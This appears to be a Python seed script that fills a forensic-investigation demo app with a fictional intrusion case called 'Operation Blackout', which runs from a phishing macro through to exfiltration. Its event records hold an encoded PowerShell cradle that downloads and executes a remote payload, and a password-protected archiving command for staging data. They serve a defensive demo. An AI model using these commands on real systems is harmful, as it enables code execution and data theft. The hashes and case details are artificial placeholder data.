"""
Forensight AI - Controlled Forensic Demo Case: "Operation Blackout"
Creates a high-fidelity, evidence-grounded cyber intrusion dataset
linking raw evidence -> extracted artifacts -> CEM events -> AI findings -> MITRE attack path.
"""

from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from app.models.models import (
    User, Case, Evidence, Artifact, Event, Finding, AttackNode, AuditLog
)
from app.core.crypto import compute_text_hash


def seed_operation_blackout(db: Session) -> Case:
    """Seeds or resets the 'Operation Blackout' forensic investigation case."""

    # Check if user exists
    user = db.query(User).filter(User.email == "rohan.investigator@forensight.ai").first()
    if not user:
        user = User(
            name="Rohan Johny",
            email="rohan.investigator@forensight.ai",
            password_hash="sha256$forensight$demo_hash",
            role="Investigator"
        )
        db.add(user)
        db.flush()

    # Check if case exists
    existing_case = db.query(Case).filter(Case.case_number == "FS-2026-001").first()
    if existing_case:
        return existing_case

    case = Case(
        user_id=user.user_id,
        case_number="FS-2026-001",
        case_name="Operation Blackout: APT Spearphishing & Data Exfiltration",
        description=(
            "Forensic investigation into targeted intrusion against workstation WS-FIN-04. "
            "Attacker leveraged weaponized Office document to execute obfuscated PowerShell, "
            "establish registry persistence, harvest credentials via LSASS access, move laterally via SMB, "
            "and exfiltrate proprietary financial archives to an external command-and-control server."
        ),
        status="Under Investigation"
    )
    db.add(case)
    db.flush()

    # Log Case Creation
    db.add(AuditLog(
        case_id=case.case_id,
        user_name=user.name,
        action="CASE_CREATED",
        details="Case FS-2026-001 initialized with strict evidence chain of custody."
    ))

    # --- Ingest 4 Evidence Items ---
    ev1 = Evidence(
        case_id=case.case_id,
        source_name="WS-FIN-04_C_Drive.E01",
        evidence_type="DISK_IMAGE",
        storage_path="/evidence_vault/FS-2026-001/WS-FIN-04_C_Drive.E01",
        hash_sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        hash_sha1="da39a3ee5e6b4b0d3255bfef95601890afd80709",
        hash_md5="d41d8cd98f00b204e9800998ecf8427e",
        byte_size="42949672960"  # 40 GB
    )
    ev2 = Evidence(
        case_id=case.case_id,
        source_name="WS-FIN-04_Memory.raw",
        evidence_type="MEMORY_DUMP",
        storage_path="/evidence_vault/FS-2026-001/WS-FIN-04_Memory.raw",
        hash_sha256="8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
        hash_sha1="5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",
        hash_md5="098f6bcd4621d373cade4e832627b4f6",
        byte_size="17179869184"  # 16 GB
    )
    ev3 = Evidence(
        case_id=case.case_id,
        source_name="Security_Sysmon_EventLogs.evtx",
        evidence_type="EVTX",
        storage_path="/evidence_vault/FS-2026-001/Security_Sysmon_EventLogs.evtx",
        hash_sha256="c592048b32e5f35d4f3576326f49b7645014e23ec9599029528f80139103b228",
        hash_sha1="250cf8b51c773f3f8dc8b4be867a9a025702e79e",
        hash_md5="ad0234829205b9033196ba818f7a872b",
        byte_size="524288000"  # 500 MB
    )
    ev4 = Evidence(
        case_id=case.case_id,
        source_name="Boundary_Pcap_Traffic.pcap",
        evidence_type="PCAP",
        storage_path="/evidence_vault/FS-2026-001/Boundary_Pcap_Traffic.pcap",
        hash_sha256="a94a8fe5ccb19ba61c4c0873d391e987982fbbd34208a8e1b6f00ef46ce16f6b",
        hash_sha1="b6589fc6ab0dc82cf12099d1c2d40ab994e8410c",
        hash_md5="900150983cd24fb0d6963f7d28e17f72",
        byte_size="1073741824"  # 1 GB
    )
    db.add_all([ev1, ev2, ev3, ev4])
    db.flush()

    # --- Extract Artifacts ---
    art1 = Artifact(
        evidence_id=ev3.evidence_id,
        artifact_type="LOG",
        parser_used="python-evtx / EventLogParser",
        raw_data={"total_records": 1420, "parser_status": "SUCCESS"}
    )
    art2 = Artifact(
        evidence_id=ev1.evidence_id,
        artifact_type="REGISTRY",
        parser_used="RegRipper v3.0",
        raw_data={"hives_parsed": ["NTUSER.DAT", "SYSTEM", "SOFTWARE"]}
    )
    art3 = Artifact(
        evidence_id=ev2.evidence_id,
        artifact_type="PROCESS",
        parser_used="Volatility 3 (windows.pstree, windows.malfind)",
        raw_data={"injected_pids": [4812], "hidden_dlls": ["svchost32.exe"]}
    )
    art4 = Artifact(
        evidence_id=ev4.evidence_id,
        artifact_type="NETWORK",
        parser_used="Zeek / NetworkFlowParser",
        raw_data={"streams_analyzed": 830, "flagged_flows": 12}
    )
    db.add_all([art1, art2, art3, art4])
    db.flush()

    # --- Normalized Forensic Events (Common Event Model) ---
    base_time = datetime(2026, 9, 2, 9, 15, 0)

    events_data = [
        # Stage 1: Initial Access
        {
            "artifact": art1,
            "time": base_time + timedelta(seconds=22),
            "type": "PROCESS_CREATE",
            "source": "Microsoft-Windows-Sysmon.evtx (EventID: 1)",
            "user": "CORP\\jdoe",
            "host": "192.168.1.105",
            "details": {
                "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                "command_line": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\jdoe\\Downloads\\INVOICE_Q3_PAYMENT.docm"',
                "process_id": 3120,
                "parent_pid": 1844
            },
            "is_anomalous": 1,
            "anomaly_score": 0.85
        },
        # Stage 2: Execution
        {
            "artifact": art1,
            "time": base_time + timedelta(seconds=42),
            "type": "PROCESS_CREATE",
            "source": "Microsoft-Windows-Sysmon.evtx (EventID: 1)",
            "user": "CORP\\jdoe",
            "host": "192.168.1.105",
            "details": {
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')",
                "process_id": 4812,
                "parent_pid": 3120
            },
            "is_anomalous": 1,
            "anomaly_score": 0.98
        },
        # Stage 2: File Drop
        {
            "artifact": art1,
            "time": base_time + timedelta(seconds=55),
            "type": "FILE_DROP",
            "source": "Microsoft-Windows-Sysmon.evtx (EventID: 11)",
            "user": "CORP\\jdoe",
            "host": "192.168.1.105",
            "details": {
                "target_filename": "C:\\Users\\jdoe\\AppData\\Roaming\\svchost32.exe",
                "created_by_pid": 4812,
                "sha256_hash": "7a9b3d1154c0e6ef45bc0981b2184e9102c98a09b3fa1237a8910bcdef456123"
            },
            "is_anomalous": 1,
            "anomaly_score": 0.88
        },
        # Stage 3: Persistence
        {
            "artifact": art2,
            "time": base_time + timedelta(minutes=3, seconds=15),
            "type": "REGISTRY_PERSISTENCE",
            "source": "NTUSER.DAT (RegRipper)",
            "user": "CORP\\jdoe",
            "host": "192.168.1.105",
            "details": {
                "hive": "HKCU",
                "key_path": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "value_name": "SecurityHealthUpdate",
                "value_data": "C:\\Users\\jdoe\\AppData\\Roaming\\svchost32.exe"
            },
            "is_anomalous": 1,
            "anomaly_score": 0.95
        },
        # Stage 4: Privilege Escalation / Credential Access
        {
            "artifact": art3,
            "time": base_time + timedelta(minutes=7, seconds=20),
            "type": "PROCESS_CREATE",
            "source": "Volatility 3 (windows.pstree)",
            "user": "CORP\\jdoe (Elevated)",
            "host": "192.168.1.105",
            "details": {
                "image": "C:\\Users\\jdoe\\AppData\\Roaming\\svchost32.exe",
                "target_accessed": "C:\\Windows\\System32\\lsass.exe",
                "desired_access": "0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)",
                "detected_action": "Credential dumping memory scan"
            },
            "is_anomalous": 1,
            "anomaly_score": 0.97
        },
        # Stage 5: Lateral Movement
        {
            "artifact": art4,
            "time": base_time + timedelta(minutes=20, seconds=45),
            "type": "NETWORK_CONNECTION",
            "source": "Zeek / NetworkFlowParser",
            "user": "CORP\\Admin-jdoe",
            "host": "192.168.1.105",
            "details": {
                "src_ip": "192.168.1.105",
                "src_port": 49210,
                "dst_ip": "192.168.1.150",
                "dst_port": 445,
                "protocol": "SMB",
                "target_host": "SRV-BACKUP-01",
                "share_accessed": "\\\\192.168.1.150\\ADMIN$"
            },
            "is_anomalous": 1,
            "anomaly_score": 0.89
        },
        # Stage 6: Staging Archive
        {
            "artifact": art1,
            "time": base_time + timedelta(minutes=27, seconds=10),
            "type": "PROCESS_CREATE",
            "source": "Microsoft-Windows-Sysmon.evtx (EventID: 1)",
            "user": "CORP\\Admin-jdoe",
            "host": "192.168.1.105",
            "details": {
                "image": "C:\\Windows\\System32\\cmd.exe",
                "command_line": 'cmd.exe /c "7z.exe a -pEncrypted2026! C:\\Windows\\Temp\\fin_q3_confidential.7z \\\\192.168.1.150\\Share\\Financials\\*"',
                "target_archive": "C:\\Windows\\Temp\\fin_q3_confidential.7z"
            },
            "is_anomalous": 1,
            "anomaly_score": 0.92
        },
        # Stage 6: Exfiltration
        {
            "artifact": art4,
            "time": base_time + timedelta(minutes=29, seconds=18),
            "type": "NETWORK_CONNECTION",
            "source": "Zeek / NetworkFlowParser",
            "user": "CORP\\Admin-jdoe",
            "host": "192.168.1.105",
            "details": {
                "src_ip": "192.168.1.105",
                "src_port": 51044,
                "dst_ip": "198.51.100.88",
                "dst_port": 443,
                "protocol": "HTTPS",
                "bytes_transferred": 88604672,  # ~84.5 MB
                "ssl_sni": "cdn-cloud-storage.external-relay.net"
            },
            "is_anomalous": 1,
            "anomaly_score": 0.96
        }
    ]

    saved_events = []
    for item in events_data:
        ev_obj = Event(
            artifact_id=item["artifact"].artifact_id,
            timestamp=item["time"],
            event_type=item["type"],
            source_entity=item["source"],
            user_account=item["user"],
            host_ip=item["host"],
            details=item["details"],
            is_anomalous=item["is_anomalous"],
            anomaly_score=item["anomaly_score"]
        )
        db.add(ev_obj)
        saved_events.append(ev_obj)
    db.flush()

    # --- Findings (Evidence-Grounded, with Examiner Validation Gate) ---
    findings_data = [
        {
            "event": saved_events[0],
            "title": "Weaponized Phishing Attachment Execution",
            "type": "INITIAL_ACCESS",
            "desc": "Victim jdoe opened invoice document from Outlook, triggering macro execution inside WINWORD.EXE.",
            "conf": 0.91,
            "status": "Accepted",
            "stage": "Initial Access",
            "order": 1,
            "mitre": "T1566.001: Spearphishing Attachment"
        },
        {
            "event": saved_events[1],
            "title": "Encoded PowerShell In-Memory Stager Execution",
            "type": "SUSPICIOUS_EXECUTION",
            "desc": "WINWORD spawned hidden PowerShell with Base64 encoded payload executing remote web cradle (185.220.101.45).",
            "conf": 0.98,
            "status": "Accepted",
            "stage": "Execution",
            "order": 2,
            "mitre": "T1059.001: Command and Scripting Interpreter: PowerShell"
        },
        {
            "event": saved_events[3],
            "title": "Registry Autorun Persistence Established",
            "type": "PERSISTENCE",
            "desc": "Modified HKCU CurrentVersion\\Run to maintain reboot persistence for masqueraded binary svchost32.exe.",
            "conf": 0.94,
            "status": "Accepted",
            "stage": "Persistence",
            "order": 3,
            "mitre": "T1547.001: Boot or Logon Autostart Execution: Registry Run Keys"
        },
        {
            "event": saved_events[4],
            "title": "LSASS Memory Inspection & Credential Access",
            "type": "CREDENTIAL_ACCESS",
            "desc": "Injected binary svchost32.exe opened handle to lsass.exe to harvest plaintext domain credentials.",
            "conf": 0.96,
            "status": "Accepted",
            "stage": "Privilege Escalation",
            "order": 4,
            "mitre": "T1003.001: OS Credential Dumping: LSASS Memory"
        },
        {
            "event": saved_events[5],
            "title": "SMB Lateral Movement to Enterprise Backup Server",
            "type": "LATERAL_MOVEMENT",
            "desc": "Attacker leveraged extracted Admin-jdoe credentials to authenticate over port 445 to SRV-BACKUP-01 (192.168.1.150).",
            "conf": 0.90,
            "status": "Accepted",
            "stage": "Lateral Movement",
            "order": 5,
            "mitre": "T1021.002: Remote Services: SMB/Windows Admin Shares"
        },
        {
            "event": saved_events[7],
            "title": "High-Volume Data Exfiltration to External Relay IP",
            "type": "DATA_EXFILTRATION",
            "desc": "Outbound transfer of 84.5 MB compressed financial archives to 198.51.100.88 over TLS port 443.",
            "conf": 0.97,
            "status": "Accepted",
            "stage": "Exfiltration",
            "order": 6,
            "mitre": "T1048.003: Exfiltration Over Alternative Protocol: Exfiltration to Cloud / Relay"
        }
    ]

    for f_info in findings_data:
        finding = Finding(
            case_id=case.case_id,
            event_id=f_info["event"].event_id,
            finding_title=f_info["title"],
            finding_type=f_info["type"],
            description=f_info["desc"],
            confidence_score=f_info["conf"],
            validation_status=f_info["status"],
            investigator_notes="Verified against host artifact and network PCAP telemetry by Lead Examiner."
        )
        db.add(finding)
        db.flush()

        attack_node = AttackNode(
            case_id=case.case_id,
            finding_id=finding.finding_id,
            mitre_technique=f_info["mitre"],
            stage_name=f_info["stage"],
            stage_order=f_info["order"],
            description=f"{f_info['stage']}: {f_info['title']} - {f_info['desc']}"
        )
        db.add(attack_node)

    db.commit()
    db.refresh(case)
    return case
